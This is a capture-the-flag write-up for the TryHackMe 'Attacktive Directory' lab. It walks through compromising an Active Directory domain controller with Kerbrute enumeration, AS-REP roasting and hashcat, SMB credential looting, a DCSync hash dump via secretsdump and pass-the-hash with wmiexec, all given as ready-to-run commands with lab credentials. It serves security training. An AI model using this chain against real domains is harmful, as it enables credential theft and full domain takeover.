# TryHackMe — Attacktive Directory

## Overview

- **Target IP:** `10.113.150.149`
- **Domain:** `spookysec.local`
- **NetBIOS Domain:** `THM-AD`
- **Difficulty:** Medium

## 1. Reconnaissance

### Nmap

First, I scanned all TCP ports to identify the available services.

```bash
nmap -sC -sV -p- 10.113.150.149
```

The scan revealed several services related to Active Directory:

- `53` — DNS
- `80` — HTTP (IIS)
- `88` — Kerberos
- `139`, `445` — NetBIOS/SMB
- `389`, `636` — LDAP/LDAPS
- `3268`, `3269` — Global Catalog
- `3389` — RDP
- `5985` — WinRM

The Kerberos, LDAP, and SMB services indicated that the target was an Active Directory domain controller.

### enum4linux

I used `enum4linux` to enumerate domain information.

```bash
enum4linux -a 10.113.150.149
```

The results revealed:

- **NetBIOS domain:** `THM-AD`
- **DNS domain:** `spookysec.local`
- **Domain SID:** `S-1-5-21-3591857110-2884097990-301047963`

## 2. User Enumeration with Kerbrute

I used Kerbrute to identify valid domain usernames.

```bash
kerbrute userenum --dc 10.113.150.149 -d spookysec.local userlist.txt
```

Several valid accounts were discovered, including:

- `svc-admin`
- `backup`
- `administrator`

The `svc-admin` account became the next target for Kerberos enumeration.

## 3. AS-REP Roasting

### Retrieving the Hash

I used Impacket's `GetNPUsers` to check whether any accounts did not require Kerberos pre-authentication.

```bash
impacket-GetNPUsers spookysec.local/ \
-dc-ip 10.113.150.149 \
-usersfile users.txt \
-format hashcat \
-outputfile hashes.txt
```

The command retrieved an AS-REP hash for `svc-admin`.

### Cracking the Hash

I used Hashcat with the RockYou wordlist.

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

To display the recovered password:

```bash
hashcat -m 18200 hashes.txt --show
```

The credentials were:

```text
Username: svc-admin
Password: management2005
```

Hashcat mode `18200` corresponds to Kerberos 5 AS-REP etype 23.

## 4. SMB Enumeration

With the recovered credentials, I enumerated the available SMB shares.

```bash
smbclient -L //10.113.150.149 -U 'THM-AD\svc-admin'
```

The `-L` option lists the server's shared resources. One interesting share was `backup`.

I connected to the share:

```bash
smbclient //10.113.150.149/backup -U 'THM-AD\svc-admin'
```

Inside the SMB shell, I listed the files and downloaded the credentials file.

```text
ls
get backup_credentials.txt
exit
```

The file contained a Base64-encoded string:

```text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

### Decoding the File

I decoded the contents using Base64.

```bash
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
```

The decoded contents were:

```text
backup@spookysec.local:backup2517860
```

This provided another set of credentials:

```text
Username: backup@spookysec.local
Password: backup2517860
```

## 5. LDAP Enumeration

I also queried LDAP to gather additional information about domain users.

Authenticated LDAP queries provided a list of domain accounts, which I saved as `domain_users.txt`.

I attempted Kerberoasting as well, but this did not return any suitable service-ticket hashes.

## 6. Dumping Domain Hashes with DCSync

The `backup` account had Active Directory replication privileges. This allowed me to use Impacket's `secretsdump` to retrieve domain password hashes.

```bash
impacket-secretsdump -just-dc 'spookysec.local/backup:backup2517860@10.113.150.149'
```

To save the output to a file:

```bash
impacket-secretsdump -just-dc 'spookysec.local/backup:backup2517860@10.113.150.149' > domain_hashes.txt
```

The output contained hashes for domain accounts, including the built-in Administrator account.

### Extracting the Administrator Hash

I searched the output file for the Administrator account.

```bash
grep 'Administrator:500:' domain_hashes.txt
```

The relevant output was:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

The Administrator's NTLM hash was:

```text
0e0363213e37b94221497260b0bcb4fc
```

The RID `500` identifies the built-in Administrator account.

### Attempting to Crack the Hash

I tried to crack the NTLM hash using John the Ripper.

```bash
echo '0e0363213e37b94221497260b0bcb4fc' > admin.hash

john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt admin.hash

john --show --format=NT admin.hash
```

The password was not recovered with the wordlist. However, cracking it was unnecessary because the hash could be used directly for authentication.

## 7. Pass-the-Hash with wmiexec

I used the Administrator's NTLM hash to authenticate without knowing the plaintext password.

```bash
impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc' 'spookysec.local/Administrator@10.113.150.149'
```

The command successfully opened a Windows command shell:

```text
C:\>
```

This technique is known as **Pass-the-Hash**. Instead of supplying the plaintext password, the authentication process uses the NTLM hash.

## 8. Retrieving the Flags

From the Windows shell, I read the Administrator's flag.

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

I also inspected the `svc-admin` desktop:

```cmd
type C:\Users\svc-admin\Desktop\user.txt.txt
```

To list the available user profiles:

```cmd
dir C:\Users
```

The relevant user flags could then be submitted to the TryHackMe answer panel.

## Attack Chain Summary

1. **Nmap** — identified exposed services.
2. **enum4linux** — enumerated Active Directory domain information.
3. **Kerbrute** — discovered valid usernames.
4. **GetNPUsers + Hashcat** — retrieved and cracked the `svc-admin` AS-REP hash.
5. **smbclient** — accessed the `backup` share and discovered additional credentials.
6. **secretsdump / DCSync** — extracted domain password hashes using the `backup` account's replication privileges.
7. **Pass-the-Hash + wmiexec** — authenticated as Administrator using the NTLM hash.
8. **Windows `type` command** — retrieved the Administrator flag.

## Key Takeaways

- Enumerate services before choosing an attack path.
- Valid usernames help identify opportunities for Kerberos attacks.
- AS-REP Roasting can expose crackable Kerberos responses when pre-authentication is disabled.
- SMB shares may contain sensitive files and additional credentials.
- Active Directory replication privileges can expose domain password hashes.
- Pass-the-Hash can provide access without recovering the original password.
